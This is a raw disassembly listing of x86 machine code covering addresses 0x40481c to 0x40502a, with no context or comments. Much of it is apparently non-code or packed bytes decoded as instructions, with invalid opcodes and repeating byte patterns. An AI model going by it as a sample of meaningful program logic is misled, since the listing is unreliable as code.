  40481c:	jae    0x404861
  40481e:	adc    ecx,edx
  404820:	popa   
  404821:	das    
  404822:	pop    ss
  404823:	inc    ecx
  404824:	inc    esp
  404825:	outs   dx,DWORD PTR ds:[esi]
  404826:	retf   
  404827:	or     eax,0x7b884399
  40482c:	inc    edx
  40482d:	cmp    al,0x43
  40482f:	ret    
  404830:	xor    dl,dh
  404832:	inc    ecx
  404833:	inc    eax
  404834:	add    eax,0x41624340
  404839:	test   BYTE PTR [eax],al
  40483b:	and    eax,0x404043
  404840:	add    BYTE PTR ds:0x626210,al
  404846:	add    eax,0x43404140
  40484b:	inc    eax
  40484c:	inc    ecx
  40484d:	add    eax,0x10664062
  404852:	inc    ebx
  404853:	bound  edx,QWORD PTR [ebx+0x58]
  404856:	inc    ecx
  404857:	fs or  eax,0xc10372a8
  40485d:	arpl   sp,bx
  40485f:	jge    0x404881
  404861:	jb     0x404887
  404863:	outs   dx,DWORD PTR ds:[esi]
  404864:	sub    al,0x6
  404866:	test   al,0x3c
  404868:	inc    esp
  404869:	idiv   BYTE PTR [esi]
  40486b:	jns    0x4048d2
  40486d:	xor    eax,0xcb0264a8
  404872:	or     DWORD PTR ds:0x29578087,esi
  404878:	pop    ss
  404879:	cmp    al,0x14
  40487b:	inc    ecx
  40487c:	inc    edi
  40487d:	lds    ebp,FWORD PTR [esi+0x38]
  404880:	add    eax,0x4041cc
  404885:	add    BYTE PTR [eax],al
  404887:	inc    eax
  404888:	inc    eax
  404889:	inc    ebx
  40488a:	bound  eax,QWORD PTR [eax]
  40488c:	inc    eax
  40488d:	inc    eax
  40488e:	add    eax,0x62434162
  404893:	inc    eax
  404894:	js     0x4048a6
  404896:	inc    ecx
  404897:	add    eax,0x5404325
  40489c:	bound  eax,QWORD PTR [eax+0x40]
  40489f:	inc    ecx
  4048a0:	inc    ebx
  4048a1:	xor    al,cl
  4048a3:	daa    
  4048a4:	push   eax
  4048a5:	xor    eax,0x44725b41
  4048aa:	sub    DWORD PTR [ebx+0x78],eax
  4048ad:	jno    0x40491f
  4048af:	js     0x40491a
  4048b1:	dec    edi
  4048b2:	in     al,dx
  4048b3:	xchg   ecx,eax
  4048b4:	push   ss
  4048b5:	mov    eax,0xc5bc8cc0
  4048ba:	movhps xmm2,QWORD PTR [eax-0x3d]
  4048be:	pop    edx
  4048bf:	bound  esp,QWORD PTR [edx-0x34]
  4048c2:	sub    dl,cl
  4048c4:	jo     0x404910
  4048c6:	into   
  4048c7:	pop    esi
  4048c8:	retf   
  4048c9:	test   al,0xb9
  4048cb:	sbb    eax,0x24144427
  4048d0:	inc    esi
  4048d1:	adc    DWORD PTR [ebx+0x57],edx
  4048d4:	mov    al,0xfe
  4048d6:	jle    0x4048b9
  4048d8:	and    eax,0x436241
  4048dd:	adc    BYTE PTR [eax+0x0],al
  4048e0:	add    eax,0x62410040
  4048e5:	inc    eax
  4048e6:	add    BYTE PTR [ebx-0x34],al
  4048e9:	inc    eax
  4048ea:	add    eax,0x78434040
  4048ef:	bound  eax,QWORD PTR [ecx+0x78]
  4048f2:	add    eax,0x62404043
  4048f7:	jge    0x404941
  4048f9:	adc    bl,BYTE PTR [edx+0x6d]
  4048fc:	dec    edi
  4048fd:	(bad)  
  4048fe:	call   0xd5fc14dd
  404903:	inc    edi
  404904:	inc    esp
  404905:	and    ebp,DWORD PTR [eax+0x58d4481c]
  40490b:	nop
  40490c:	push   eax
  40490d:	and    al,0x39
  40490f:	inc    edx
  404910:	add    eax,0x1413718e
  404915:	sbb    DWORD PTR [ebx-0x23],edi
  404918:	retf   
  404919:	div    BYTE PTR [ebp-0x16]
  40491c:	dec    edx
  40491d:	in     al,dx
  40491e:	bound  esp,QWORD PTR [ebx+0x5cd25070]
  404924:	arpl   WORD PTR ds:0x54041cb,di
  40492a:	inc    eax
  40492b:	bound  eax,QWORD PTR [ebx+0x43]
  40492e:	add    eax,0x62004040
  404933:	inc    eax
  404934:	add    BYTE PTR [ecx+0x40],al
  404937:	inc    ebx
  404938:	test   BYTE PTR ds:0x58054041,ah
  40493e:	inc    eax
  40493f:	inc    eax
  404940:	bound  eax,QWORD PTR [eax+0x66]
  404943:	inc    ecx
  404944:	inc    eax
  404945:	add    eax,0x92467d00
  40494a:	call   DWORD PTR [eax-0x26ffb468]
  404950:	std    
  404951:	mov    al,ds:0x30626033
  404956:	(bad)  
  404957:	loopne 0x40492d
  404959:	xchg   esp,eax
  40495a:	aaa    
  40495b:	pop    esi
  40495c:	inc    eax
  40495d:	out    dx,al
  40495e:	arpl   WORD PTR [eax+0x62],dx
  404961:	add    ecx,edx
  404963:	adc    DWORD PTR [eax+0xf6230e1],ecx
  404969:	in     eax,0x64
  40496b:	stos   DWORD PTR es:[edi],eax
  40496c:	add    BYTE PTR [eax],al
  40496e:	inc    ebx
  40496f:	inc    eax
  404970:	bound  eax,QWORD PTR ds:0x25404110
  404976:	add    ah,cl
  404978:	inc    ebx
  404979:	add    eax,0x40402562
  40497e:	add    BYTE PTR [eax+0x40],al
  404981:	inc    ecx
  404982:	inc    ecx
  404983:	add    eax,0x78434025
  404988:	bound  eax,QWORD PTR [eax-0x7c]
  40498b:	inc    eax
  40498c:	inc    ecx
  40498d:	sub    ebp,DWORD PTR [eax-0x58c313e4]
  404993:	icebp  
  404994:	repz adc DWORD PTR [edx],0xa47a2cd4
  40499b:	jns    0x4049ae
  40499d:	fisttp WORD PTR [edx+ebx*2-0xc68df9e]
  4049a4:	ss inc eax
  4049a6:	adc    eax,0x86fd940
  4049ab:	push   edi
  4049ac:	xor    BYTE PTR [edx-0x337fff35],ah
  4049b2:	mov    WORD PTR [ebx],?
  4049b4:	mov    ch,0x81
  4049b6:	adc    DWORD PTR [eax+0x63],eax
  4049b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ba:	mov    esi,0x447b1242
  4049bf:	cs inc ecx
  4049c1:	inc    eax
  4049c2:	inc    eax
  4049c3:	inc    ebx
  4049c4:	int3   
  4049c5:	add    BYTE PTR ds:0x56240,al
  4049cb:	inc    ebx
  4049cc:	inc    eax
  4049cd:	inc    eax
  4049ce:	add    BYTE PTR [ecx+0x62],al
  4049d1:	bound  eax,QWORD PTR [eax]
  4049d3:	int3   
  4049d4:	inc    eax
  4049d5:	inc    ebx
  4049d6:	add    eax,0x43624041
  4049db:	adc    BYTE PTR [ecx+0x5],al
  4049de:	inc    eax
  4049df:	pop    ds
  4049e0:	add    eax,0xcb2331f7
  4049e5:	add    ebx,0x58ebcb28
  4049eb:	cli    
  4049ec:	addr16 ret 
  4049ee:	bound  esp,QWORD PTR [edx-0x68]
  4049f1:	sbb    cl,dl
  4049f3:	dec    eax
  4049f4:	ss mov esp,0x56e7db22
  4049fa:	inc    esp
  4049fb:	adc    DWORD PTR [ecx+0x49],eax
  4049fe:	and    al,0xbb
  404a00:	jg     0x404996
  404a02:	xor    DWORD PTR [ebx-0x50],ebp
  404a05:	sub    eax,0x4362a862
  404a0a:	inc    eax
  404a0b:	adc    BYTE PTR ds:0x4158cc40,al
  404a11:	inc    ebx
  404a12:	bound  eax,QWORD PTR [ecx+0x40]
  404a15:	add    eax,0x4140
  404a1a:	and    eax,0x40400062
  404a1f:	add    eax,0x84404340
  404a24:	int3   
  404a25:	js     0x404a27
  404a27:	inc    ecx
  404a28:	adc    BYTE PTR [edx+0xf],ah
  404a2b:	out    dx,eax
  404a2c:	xchg   BYTE PTR [edi],bh
  404a2e:	adc    DWORD PTR ds:0xc5102a38,edi
  404a34:	lds    edx,FWORD PTR ds:0x4048c351
  404a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a3b:	sub    dh,BYTE PTR [edx-0x7b928e6c]
  404a41:	push   ebx
  404a42:	inc    edx
  404a43:	xor    al,0x7f
  404a45:	adc    BYTE PTR cs:[ebx+eax*8+0x20],al
  404a4a:	in     al,dx
  404a4b:	push   eax
  404a4c:	(bad)  
  404a4d:	jp     0x404a80
  404a4f:	cmp    bl,BYTE PTR [esp+edi*8+0x2c]
  404a53:	stos   DWORD PTR es:[edi],eax
  404a54:	add    DWORD PTR [ecx+0x23],esi
  404a57:	fdiv   QWORD PTR [edi]
  404a59:	arpl   WORD PTR [eax+eax*1+0x40],sp
  404a5d:	inc    ecx
  404a5e:	inc    eax
  404a5f:	inc    ebx
  404a60:	bound  ax,DWORD PTR ds:0x40434100
  404a67:	add    eax,0x40054062
  404a6c:	bound  eax,QWORD PTR [ecx+0x40]
  404a6f:	inc    ebx
  404a70:	inc    eax
  404a71:	add    eax,0x25405841
  404a76:	bound  eax,QWORD PTR [eax+0x43]
  404a79:	inc    eax
  404a7a:	adc    bl,al
  404a7c:	mov    ebp,0xa8037341
  404a81:	je     0x404afa
  404a83:	(bad)  
  404a84:	and    al,0xb3
  404a86:	xchg   ebp,eax
  404a87:	adc    BYTE PTR ds:[eax],cl
  404a8a:	stos   DWORD PTR es:[edi],eax
  404a8b:	add    eax,0x5dd2565e
  404a90:	mov    ecx,cs
  404a92:	mov    esp,0x2271a787
  404a97:	inc    eax
  404a98:	inc    ecx
  404a99:	inc    ebx
  404a9a:	inc    eax
  404a9b:	add    eax,0x43406262
  404aa0:	inc    ecx
  404aa1:	adc    BYTE PTR [eax],al
  404aa3:	inc    eax
  404aa4:	add    eax,0x43000562
  404aa9:	add    BYTE PTR [ecx+0x40],al
  404aac:	inc    eax
  404aad:	add    eax,0x400062
  404ab2:	inc    ebx
  404ab3:	inc    eax
  404ab4:	js     0x404af7
  404ab6:	inc    ecx
  404ab7:	bound  eax,QWORD PTR [eax+0x62]
  404aba:	daa    
  404abb:	dec    eax
  404abc:	das    
  404abd:	jnp    0x404a7a
  404abf:	ja     0x404b07
  404ac1:	data16 das 
  404ac3:	or     eax,0x93981a27
  404ac8:	jae    0x404a8a
  404aca:	pop    DWORD PTR [edx-0x26]
  404acd:	arpl   WORD PTR [ecx],bp
  404acf:	inc    esp
  404ad0:	mov    ebp,0xf841904c
  404ad5:	push   esp
  404ad6:	mov    al,ds:0x63a857f1
  404adb:	cmp    al,0x41
  404add:	add    eax,0xfa31438b
  404ae2:	push   ebx
  404ae3:	mov    BYTE PTR [eax-0x35],dl
  404ae6:	push   cs
  404ae7:	bound  eax,QWORD PTR [eax+0x5]
  404aea:	inc    ecx
  404aeb:	add    BYTE PTR [ebx+0x40],al
  404aee:	inc    eax
  404aef:	inc    ecx
  404af0:	inc    eax
  404af1:	inc    eax
  404af2:	bound  eax,QWORD PTR ds:0x5624300
  404af8:	add    BYTE PTR [eax+0x40],al
  404afb:	add    BYTE PTR [ecx+0x43],al
  404afe:	add    BYTE PTR [eax+0x41],al
  404b01:	add    eax,0x40436200
  404b06:	inc    eax
  404b07:	add    eax,0xa4a3362
  404b0c:	xor    al,0x41
  404b0e:	xchg   DWORD PTR [ecx-0x32],edx
  404b11:	push   DWORD PTR [ecx]
  404b13:	(bad)  
  404b14:	out    dx,al
  404b15:	cmp    eax,0x4118c95c
  404b1a:	sub    BYTE PTR [edx+eiz*2+0x4142d744],bh
  404b21:	inc    eax
  404b22:	add    eax,0x41624340
  404b27:	test   BYTE PTR [eax],al
  404b29:	and    eax,0x404043
  404b2e:	add    BYTE PTR ds:0x626210,al
  404b34:	add    eax,0x43404140
  404b39:	inc    eax
  404b3a:	inc    ecx
  404b3b:	add    eax,0x10664062
  404b40:	inc    ebx
  404b41:	bound  esp,QWORD PTR [esi+0x62f95311]
  404b47:	les    edi,FWORD PTR [esi+0x3fd60983]
  404b4d:	inc    ebp
  404b4e:	arpl   WORD PTR [edi+edx*2+0x3c],si
  404b52:	lods   eax,DWORD PTR ds:[esi]
  404b53:	xor    eax,0x6a6293
  404b58:	xor    BYTE PTR ds:0x1153571e,cl
  404b5e:	test   al,0x9e
  404b60:	ins    DWORD PTR es:[edi],dx
  404b61:	retf   
  404b62:	retf   0x5171
  404b65:	retf   
  404b66:	inc    eax
  404b67:	cs in  eax,0x59
  404b6a:	rol    BYTE PTR ds:0x4041cc,1
  404b70:	add    BYTE PTR [eax],al
  404b72:	inc    eax
  404b73:	inc    eax
  404b74:	inc    ebx
  404b75:	bound  eax,QWORD PTR [eax]
  404b77:	inc    eax
  404b78:	inc    eax
  404b79:	add    eax,0x62434162
  404b7e:	inc    eax
  404b7f:	js     0x404b91
  404b81:	inc    ecx
  404b82:	add    eax,0x5404325
  404b87:	bound  eax,QWORD PTR [eax+0x40]
  404b8a:	inc    ecx
  404b8b:	inc    ebx
  404b8c:	push   ecx
  404b8d:	inc    edx
  404b8e:	mov    esp,0x35389840
  404b93:	xor    al,0xb1
  404b95:	(bad)  
  404b97:	inc    eax
  404b98:	test   al,0x62
  404b9a:	mov    esp,0xcf591317
  404b9f:	into   
  404ba0:	lods   al,BYTE PTR ds:[esi]
  404ba1:	in     eax,dx
  404ba2:	add    eax,0x6558339b
  404ba7:	inc    esp
  404ba8:	and    eax,0x436241
  404bad:	adc    BYTE PTR [eax+0x0],al
  404bb0:	add    eax,0x62410040
  404bb5:	inc    eax
  404bb6:	add    BYTE PTR [ebx-0x34],al
  404bb9:	inc    eax
  404bba:	add    eax,0x78434040
  404bbf:	bound  eax,QWORD PTR [ecx+0x78]
  404bc2:	add    eax,0x62404043
  404bc7:	retf   
  404bc8:	cmp    BYTE PTR [ebx+0x6a],bh
  404bcb:	dec    ebp
  404bcc:	das    
  404bcd:	mov    al,0x46
  404bcf:	adc    eax,0x3daab443
  404bd4:	mov    esi,0xc842d415
  404bd9:	inc    ebp
  404bda:	jae    0x404c06
  404bdc:	xor    al,0xd5
  404bde:	pop    ebp
  404bdf:	jmp    0xbad4:0xd30ef77c
  404be6:	aam    0x41
  404be8:	inc    eax
  404be9:	add    eax,0x43436240
  404bee:	add    eax,0x62004040
  404bf3:	inc    eax
  404bf4:	add    BYTE PTR [ecx+0x40],al
  404bf7:	inc    ebx
  404bf8:	test   BYTE PTR ds:0x58054041,ah
  404bfe:	inc    eax
  404bff:	inc    eax
  404c00:	bound  eax,QWORD PTR [eax+0x66]
  404c03:	inc    ecx
  404c04:	inc    eax
  404c05:	add    eax,0x50a80400
  404c0a:	leave  
  404c0b:	dec    ebp
  404c0c:	add    DWORD PTR [esi],ebp
  404c0e:	cmp    bl,BYTE PTR [esi+0x43]
  404c11:	arpl   WORD PTR [eax+0x11],ax
  404c14:	inc    ebp
  404c15:	xor    al,0xf2
  404c17:	inc    eax
  404c18:	xor    dh,BYTE PTR [ecx+0x40]
  404c1b:	mov    edi,0x40d96512
  404c20:	mov    ah,0xa9
  404c22:	inc    eax
  404c23:	das    
  404c24:	jg     0x404c59
  404c26:	add    BYTE PTR [eax],al
  404c28:	inc    ebx
  404c29:	inc    eax
  404c2a:	bound  eax,QWORD PTR ds:0x25404110
  404c30:	add    ah,cl
  404c32:	inc    ebx
  404c33:	add    eax,0x40402562
  404c38:	add    BYTE PTR [eax+0x40],al
  404c3b:	inc    ecx
  404c3c:	inc    ecx
  404c3d:	add    eax,0x78434025
  404c42:	bound  eax,QWORD PTR [eax-0x7c]
  404c45:	inc    eax
  404c46:	inc    ecx
  404c47:	xor    DWORD PTR [eax+0xb],esi
  404c4a:	cli    
  404c4b:	inc    eax
  404c4c:	je     0x404c57
  404c4e:	xor    al,0x30
  404c50:	inc    ecx
  404c51:	lds    ebp,FWORD PTR [ebx+0x40b16d40]
  404c57:	fild   WORD PTR fs:[esi-0x58]
  404c5b:	inc    eax
  404c5c:	push   ds
  404c5d:	push   ecx
  404c5e:	push   0x4244c540
  404c63:	inc    eax
  404c64:	xchg   ebp,eax
  404c65:	push   ecx
  404c66:	cmp    DWORD PTR [ebx+0x5c],esp
  404c69:	(bad)  
  404c6c:	(bad)  
  404c6e:	inc    edx
  404c6f:	jne    0x404cd6
  404c71:	ins    DWORD PTR es:[edi],dx
  404c72:	fcomp  DWORD PTR [ecx-0x23b7eeef]
  404c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c79:	and    al,0x63
  404c7b:	stos   BYTE PTR es:[edi],al
  404c7c:	inc    ecx
  404c7d:	inc    eax
  404c7e:	inc    eax
  404c7f:	inc    ebx
  404c80:	int3   
  404c81:	add    BYTE PTR ds:0x56240,al
  404c87:	inc    ebx
  404c88:	inc    eax
  404c89:	inc    eax
  404c8a:	add    BYTE PTR [ecx+0x62],al
  404c8d:	bound  eax,QWORD PTR [eax]
  404c8f:	int3   
  404c90:	inc    eax
  404c91:	inc    ebx
  404c92:	add    eax,0x43624041
  404c97:	adc    BYTE PTR [ecx+0x5],al
  404c9a:	inc    eax
  404c9b:	imul   esi,eax,0xfffffff0
  404c9e:	jmp    eax
  404ca0:	inc    esp
  404ca1:	test   al,0x7c
  404ca3:	xor    ebx,edi
  404ca5:	push   edx
  404ca6:	dec    esp
  404ca7:	(bad)  
  404ca8:	les    edx,FWORD PTR ds:0x3cef539b
  404cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404caf:	loope  0x404cc8
  404cb1:	retf   
  404cb2:	xchg   edx,eax
  404cb3:	shr    DWORD PTR [ecx-0x57db98cc],1
  404cb9:	mov    esp,0x10404362
  404cbe:	add    eax,0x4158cc40
  404cc3:	inc    ebx
  404cc4:	bound  eax,QWORD PTR [ecx+0x40]
  404cc7:	add    eax,0x4140
  404ccc:	and    eax,0x40400062
  404cd1:	add    eax,0x84404340
  404cd6:	int3   
  404cd7:	js     0x404cd9
  404cd9:	inc    ecx
  404cda:	adc    BYTE PTR [edx+0xf],ah
  404cdd:	adc    eax,0x4c403511
  404ce2:	lods   al,BYTE PTR ds:[esi]
  404ce3:	inc    eax
  404ce4:	inc    ecx
  404ce5:	enter  0x54f8,0x64
  404ce9:	ror    bl,1
  404ceb:	sub    dl,BYTE PTR [edx+0x12]
  404cee:	test   al,0xf4
  404cf0:	cmp    BYTE PTR [ebx],ah
  404cf2:	adc    eax,0xfec7d841
  404cf7:	xor    BYTE PTR [edx+0x0],al
  404cfa:	inc    eax
  404cfb:	inc    ecx
  404cfc:	inc    eax
  404cfd:	inc    ebx
  404cfe:	bound  ax,DWORD PTR ds:0x40434100
  404d05:	add    eax,0x40054062
  404d0a:	bound  eax,QWORD PTR [ecx+0x40]
  404d0d:	inc    ebx
  404d0e:	inc    eax
  404d0f:	add    eax,0x25405841
  404d14:	bound  eax,QWORD PTR [eax+0x43]
  404d17:	inc    eax
  404d18:	adc    BYTE PTR [esi],bh
  404d1a:	inc    edx
  404d1b:	xchg   esi,eax
  404d1c:	mov    esp,0x4540438e
  404d21:	test   al,0x40
  404d23:	and    BYTE PTR ds:0x2431b28a,cl
  404d29:	dec    esp
  404d2a:	shl    BYTE PTR [ebp-0x35],1
  404d2d:	test   al,0x1
  404d2f:	dec    edi
  404d30:	in     al,0x41
  404d32:	or     eax,0x43414074
  404d37:	inc    eax
  404d38:	add    eax,0x43406262
  404d3d:	inc    ecx
  404d3e:	adc    BYTE PTR [eax],al
  404d40:	inc    eax
  404d41:	add    eax,0x43000562
  404d46:	add    BYTE PTR [ecx+0x40],al
  404d49:	inc    eax
  404d4a:	add    eax,0x400062
  404d4f:	inc    ebx
  404d50:	inc    eax
  404d51:	js     0x404d94
  404d53:	inc    ecx
  404d54:	bound  eax,QWORD PTR [eax-0x4c]
  404d57:	rcr    DWORD PTR [ebp+0x51],1
  404d5a:	and    BYTE PTR [ebx-0x38],ch
  404d5d:	bound  eax,QWORD PTR [ecx+0x61]
  404d60:	push   ebp
  404d61:	lahf   
  404d62:	bound  edi,QWORD PTR [eax]
  404d64:	jp     0x404d99
  404d66:	inc    edi
  404d67:	xchg   esi,eax
  404d68:	jo     0x404cfc
  404d6a:	pop    es
  404d6b:	arpl   WORD PTR [eax+eax*4+0x177268d8],dx
  404d72:	cmp    BYTE PTR [ecx+0x67],ah
  404d75:	jns    0x404d2b
  404d77:	inc    eax
  404d78:	outs   dx,BYTE PTR ds:[esi]
  404d79:	mov    esi,0x5406257
  404d7e:	inc    ecx
  404d7f:	add    BYTE PTR [ebx+0x40],al
  404d82:	inc    eax
  404d83:	inc    ecx
  404d84:	inc    eax
  404d85:	inc    eax
  404d86:	bound  eax,QWORD PTR ds:0x5624300
  404d8c:	add    BYTE PTR [eax+0x40],al
  404d8f:	add    BYTE PTR [ecx+0x43],al
  404d92:	add    BYTE PTR [eax+0x41],al
  404d95:	add    eax,0x40436200
  404d9a:	inc    eax
  404d9b:	add    eax,0x344e8062
  404da0:	add    eax,0xc49c4840
  404da5:	arpl   WORD PTR [eax+0x7040cb4c],bp
  404dab:	mov    edi,0x326a7b44
  404db0:	push   edx
  404db1:	inc    eax
  404db2:	sub    eax,0x40054041
  404db7:	inc    ebx
  404db8:	bound  eax,QWORD PTR [ecx-0x7c]
  404dbb:	add    BYTE PTR ds:0x404043,ah
  404dc1:	add    BYTE PTR ds:0x626210,al
  404dc7:	add    eax,0x43404140
  404dcc:	inc    eax
  404dcd:	inc    ecx
  404dce:	add    eax,0x10664062
  404dd3:	inc    ebx
  404dd4:	bound  eax,QWORD PTR [eax-0x4e]
  404dd7:	int3   
  404dd8:	and    eax,0x453d41f2
  404ddd:	inc    eax
  404dde:	sbb    esp,DWORD PTR [eax-0x13b49794]
  404de4:	repnz dec esi
  404de6:	(bad)  
  404de7:	push   cs
  404de8:	push   edx
  404de9:	bound  edi,QWORD PTR [ebx+eiz*1-0x6eae5b0b]
  404df0:	inc    eax
  404df1:	shl    BYTE PTR [edi-0x1f],0x6e
  404df5:	sub    al,0xe0
  404df7:	bound  edx,QWORD PTR [eax]
  404df9:	dec    ecx
  404dfa:	test   al,0x45
  404dfd:	and    bl,dh
  404dff:	int    0x6b
  404e01:	and    eax,0x59b0ff5
  404e06:	int3   
  404e07:	inc    ecx
  404e08:	inc    eax
  404e09:	add    BYTE PTR [eax],al
  404e0b:	add    BYTE PTR [eax+0x40],al
  404e0e:	inc    ebx
  404e0f:	bound  eax,QWORD PTR [eax]
  404e11:	inc    eax
  404e12:	inc    eax
  404e13:	add    eax,0x62434162
  404e18:	inc    eax
  404e19:	js     0x404e2b
  404e1b:	inc    ecx
  404e1c:	add    eax,0x5404325
  404e21:	bound  eax,QWORD PTR [eax+0x40]
  404e24:	inc    ecx
  404e25:	inc    ebx
  404e26:	call   0x3a2d5fd3
  404e2b:	cs jg  0x404e70
  404e2e:	inc    eax
  404e2f:	inc    edx
  404e30:	xor    ebp,DWORD PTR [eax-0x4ced3258]
  404e36:	inc    edi
  404e37:	push   0x7e
  404e39:	adc    BYTE PTR [edx],dl
  404e3b:	and    eax,0x436241
  404e40:	adc    BYTE PTR [eax+0x0],al
  404e43:	add    eax,0x62410040
  404e48:	inc    eax
  404e49:	add    BYTE PTR [ebx-0x34],al
  404e4c:	inc    eax
  404e4d:	add    eax,0x78434040
  404e52:	bound  eax,QWORD PTR [ecx+0x78]
  404e55:	add    eax,0x62404043
  404e5a:	adc    ebp,edx
  404e5c:	inc    ecx
  404e5d:	push   eax
  404e5e:	bound  edi,QWORD PTR [si+0x4ba0]
  404e63:	lods   eax,DWORD PTR ds:[esi]
  404e64:	push   eax
  404e65:	sbb    eax,0x4141c5d3
  404e6a:	cmp    DWORD PTR ds:[ebx],esi
  404e6d:	aad    0xc4
  404e6f:	dec    esp
  404e70:	std    
  404e71:	jle    0x404df8
  404e73:	or     al,BYTE PTR [ecx+0x41]
  404e76:	pop    edx
  404e77:	int    0x7c
  404e79:	nop
  404e7a:	inc    ecx
  404e7b:	inc    eax
  404e7c:	add    eax,0x43436240
  404e81:	add    eax,0x62004040
  404e86:	inc    eax
  404e87:	add    BYTE PTR [ecx+0x40],al
  404e8a:	inc    ebx
  404e8b:	test   BYTE PTR ds:0x58054041,ah
  404e91:	inc    eax
  404e92:	inc    eax
  404e93:	bound  eax,QWORD PTR [eax+0x66]
  404e96:	inc    ecx
  404e97:	inc    eax
  404e98:	add    eax,0x3b084c00
  404e9d:	pop    eax
  404e9e:	and    BYTE PTR [eax-0x4b329d9c],bh
  404ea4:	inc    edx
  404ea5:	cmp    DWORD PTR [ecx],ecx
  404ea7:	inc    ecx
  404ea8:	or     esp,DWORD PTR [eax-0x44]
  404eab:	jo     0x404ebd
  404ead:	push   ebx
  404eae:	clc    
  404eaf:	and    BYTE PTR [eax+0x2753052a],dh
  404eb5:	add    BYTE PTR [eax],al
  404eb7:	inc    ebx
  404eb8:	inc    eax
  404eb9:	bound  eax,QWORD PTR ds:0x25404110
  404ebf:	add    ah,cl
  404ec1:	inc    ebx
  404ec2:	add    eax,0x40402562
  404ec7:	add    BYTE PTR [eax+0x40],al
  404eca:	inc    ecx
  404ecb:	inc    ecx
  404ecc:	add    eax,0x78434025
  404ed1:	bound  eax,QWORD PTR [eax-0x7c]
  404ed4:	inc    eax
  404ed5:	inc    ecx
  404ed6:	push   ecx
  404ed7:	push   edi
  404ed8:	int3   
  404ed9:	pop    ebp
  404eda:	xor    bl,cl
  404edc:	cmp    esi,DWORD PTR [esi]
  404ede:	gs das 
  404ee0:	mov    ch,0x45
  404ee2:	push   esi
  404ee3:	js     0x404e79
  404ee5:	inc    ecx
  404ee6:	jae    0x404f1c
  404ee8:	les    edi,FWORD PTR [eax]
  404eea:	bound  esi,QWORD PTR ds:0x99417246
  404ef0:	dec    edi
  404ef1:	sub    BYTE PTR [eax],0x3c
  404ef4:	cmp    DWORD PTR [esi-0x2d],ebp
  404ef7:	add    BYTE PTR [ebp+0x1f],0x40
  404efb:	mov    edx,0x53534920
  404f00:	mov    eax,0x41c3ad81
  404f05:	inc    eax
  404f06:	inc    eax
  404f07:	inc    ebx
  404f08:	int3   
  404f09:	add    BYTE PTR ds:0x56240,al
  404f0f:	inc    ebx
  404f10:	inc    eax
  404f11:	inc    eax
  404f12:	add    BYTE PTR [ecx+0x62],al
  404f15:	bound  eax,QWORD PTR [eax]
  404f17:	int3   
  404f18:	inc    eax
  404f19:	inc    ebx
  404f1a:	add    eax,0x43624041
  404f1f:	adc    BYTE PTR [ecx+0x5],al
  404f22:	inc    eax
  404f23:	pop    es
  404f24:	icebp  
  404f25:	jno    0x404fa5
  404f27:	ret    
  404f28:	bound  edi,QWORD PTR [ebx+0x51]
  404f2b:	aad    0x15
  404f2d:	scas   eax,DWORD PTR es:[edi]
  404f2e:	push   edx
  404f2f:	inc    ebx
  404f30:	add    bl,BYTE PTR [eax-0x2]
  404f33:	cmp    BYTE PTR [ecx],dl
  404f35:	inc    esp
  404f36:	retf   
  404f37:	and    BYTE PTR fs:[edx+0x4f],0x37
  404f3c:	add    dl,cl
  404f3e:	in     eax,0x68
  404f40:	bound  ebx,QWORD PTR [eax]
  404f42:	bound  eax,QWORD PTR [ebx+0x40]
  404f45:	adc    BYTE PTR ds:0x4158cc40,al
  404f4b:	inc    ebx
  404f4c:	bound  eax,QWORD PTR [ecx+0x40]
  404f4f:	add    eax,0x4140
  404f54:	and    eax,0x40400062
  404f59:	add    eax,0x84404340
  404f5e:	int3   
  404f5f:	js     0x404f61
  404f61:	inc    ecx
  404f62:	adc    BYTE PTR [edx+0xf],ah
  404f65:	test   al,0x1d
  404f67:	rcl    DWORD PTR [esi],cl
  404f69:	xor    eax,0xd080c63
  404f6e:	inc    BYTE PTR [edx+0x31]
  404f71:	bound  ebx,QWORD PTR [eax-0x6bbc9dd8]
  404f77:	mov    ah,0x41
  404f79:	sub    al,dl
  404f7b:	push   esi
  404f7c:	or     al,0xac
  404f7e:	enter  0x766e,0x34
  404f82:	dec    ebx
  404f83:	xor    al,0x9c
  404f85:	or     eax,0x6d414046
  404f8a:	and    bl,BYTE PTR [eax*2+0x7f52cfcb]
  404f91:	sub    BYTE PTR ds:0xd342a5ba,dh
  404f97:	std    
  404f98:	add    BYTE PTR [eax+0x41],al
  404f9b:	inc    eax
  404f9c:	inc    ebx
  404f9d:	bound  ax,DWORD PTR ds:0x40434100
  404fa4:	add    eax,0x40054062
  404fa9:	bound  eax,QWORD PTR [ecx+0x40]
  404fac:	inc    ebx
  404fad:	inc    eax
  404fae:	add    eax,0x25405841
  404fb3:	bound  eax,QWORD PTR [eax+0x43]
  404fb6:	inc    eax
  404fb7:	adc    BYTE PTR [ebp+0x52],bh
  404fba:	test   al,0xc3
  404fbc:	add    eax,0xff374040
  404fc1:	in     eax,0x11
  404fc3:	mov    esi,0x4040ff86
  404fc8:	push   eax
  404fc9:	mov    WORD PTR [ecx+0x1],gs
  404fcc:	inc    eax
  404fcd:	mov    WORD PTR [eax+0x50],es
  404fd0:	mov    edi,0xa4147f92
  404fd5:	inc    eax
  404fd6:	inc    ecx
  404fd7:	inc    ebx
  404fd8:	inc    eax
  404fd9:	add    eax,0x43406262
  404fde:	inc    ecx
  404fdf:	adc    BYTE PTR [eax],al
  404fe1:	inc    eax
  404fe2:	add    eax,0x43000562
  404fe7:	add    BYTE PTR [ecx+0x40],al
  404fea:	inc    eax
  404feb:	add    eax,0x400062
  404ff0:	inc    ebx
  404ff1:	inc    eax
  404ff2:	js     0x405035
  404ff4:	inc    ecx
  404ff5:	bound  eax,QWORD PTR [eax+0xd]
  404ff8:	inc    eax
  404ff9:	outs   dx,DWORD PTR ds:[esi]
  404ffa:	push   eax
  404ffb:	mov    ah,0x62
  404ffd:	test   DWORD PTR ds:0xbf40db37,0x864805b1
  405007:	(bad)
  40500a:	add    eax,0x4070c945
  40500f:	mov    esp,0x6dbe4980
  405014:	or     bl,BYTE PTR [edx+eiz*2+0x410540]
  40501b:	inc    ebx
  40501c:	inc    eax
  40501d:	inc    eax
  40501e:	inc    ecx
  40501f:	inc    eax
  405020:	inc    eax
  405021:	bound  eax,QWORD PTR ds:0x5624300
  405027:	add    BYTE PTR [eax+0x40],al
  40502a:	add    BYTE PTR [ecx+0x43],al
